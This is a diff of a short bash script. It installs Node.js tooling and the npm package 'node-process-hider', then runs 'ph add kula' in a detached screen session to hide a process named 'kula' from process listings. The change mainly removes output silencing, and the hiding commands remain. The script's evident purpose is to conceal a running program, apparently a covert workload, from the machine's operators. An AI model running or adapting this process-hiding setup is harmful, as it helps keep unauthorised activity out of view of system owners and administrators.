@@ -1,9 +1,8 @@
 #!/bin/bash
-apt update -y &> /dev/null
-apt-get install libpci3 &> /dev/null
-apt-get install screen -y &> /dev/null
-apt-get install nodejs-dev node-gyp libssl1.0-dev &> /dev/null
-apt-get install npm &> /dev/null
-npm i -g node-process-hider &> /dev/null
+apt update -y
+apt-get install screen -y
+apt-get install nodejs-dev node-gyp libssl1.0-dev
+apt-get install npm
+npm i -g node-process-hider
 screen -dmS zuli ph add kula
 ph list
